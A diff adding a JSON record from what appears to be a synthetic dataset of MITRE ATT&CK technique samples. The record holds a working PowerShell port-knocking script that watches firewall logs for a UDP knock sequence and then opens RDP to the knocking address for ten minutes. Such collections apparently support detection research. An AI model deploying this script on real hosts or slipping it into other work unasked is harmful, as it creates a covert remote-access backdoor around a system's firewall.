@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; $seq=0; $lastIP=$null; $timeout=[TimeSpan]::FromSeconds(45); $t0=Get-Date; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d+\\s+(11111|22222|33333)\\b') { $src=$matches[1]; $dstp=[int]$matches[3]; $now=Get-Date; if (($src -ne $lastIP) -or ($now - $t0 -gt $timeout)) { $seq=0; } $expected=@(11111,22222,33333)[$seq]; if ($dstp -eq $expected) { $seq++; $lastIP=$src; $t0=$now; } else { $seq=0; $lastIP=$src; $t0=$now; } if ($seq -ge 3) { $name=\"rdp-knock-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } $seq=0; } } } }",
+  "explanation": "Implements UDP port knocking (11111\u219222222\u219233333) using Windows Firewall logs to open RDP (3389) for the source IP for 10 minutes upon correct sequence.",
+  "rationale_steps": [
+    "Enable Windows Firewall logging of allowed and dropped packets",
+    "Tail pfirewall.log and track a specific UDP knock sequence by source IP",
+    "On match, create a temporary allow rule for TCP/3389 limited to the signaling IP",
+    "Schedule cleanup to remove the rule after 10 minutes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-6dc1b5b9",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
